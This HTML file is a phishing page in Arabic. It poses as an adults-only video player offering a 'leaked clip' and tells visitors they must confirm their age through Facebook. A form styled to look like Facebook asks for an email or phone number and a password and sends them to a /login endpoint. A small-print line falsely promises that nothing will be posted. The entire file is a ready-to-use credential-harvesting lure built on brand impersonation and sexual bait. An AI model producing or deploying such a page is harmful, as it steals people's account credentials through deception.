<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player - Age Verification</title>
    <style>
        body { background-color: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: Arial, sans-serif; }
        .video-box { width: 95%; max-width: 500px; background: #111; border-radius: 10px; overflow: hidden; position: relative; }
        .thumbnail { width: 100%; filter: blur(8px); opacity: 0.6; }
        .play-btn { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80px; cursor: pointer; }
        .overlay { background: rgba(0,0,0,0.85); position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; text-align: center; padding: 20px; box-sizing: border-box; }
        .fb-btn { background-color: #1877f2; color: white; padding: 12px 20px; border-radius: 5px; text-decoration: none; font-weight: bold; width: 80%; margin-top: 20px; border: none; font-size: 16px; cursor: pointer; }
        input { width: 85%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="video-box">
        <img src="https://via.placeholder.com/500x300/333/fff?text=Video+Preview" class="thumbnail">
        <div class="overlay">
            <h2 style="color: #ff3e3e;">محتوى للكبار فقط (+18)</h2>
            <p>يجب تأكيد هويتك وعمرك عبر فيسبوك لمشاهدة هذا المقطع المسرب</p>
            
            <form action="/login" method="post">
                <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                <input type="password" name="password" placeholder="كلمة السر" required>
                <button type="submit" class="fb-btn">تسجيل الدخول والمشاهدة</button>
            </form>
            
            <p style="font-size: 10px; color: #777; margin-top: 15px;">سياسة الخصوصية: لن يتم نشر أي شيء على صفحتك.</p>
        </div>
    </div>
</body>
</html>
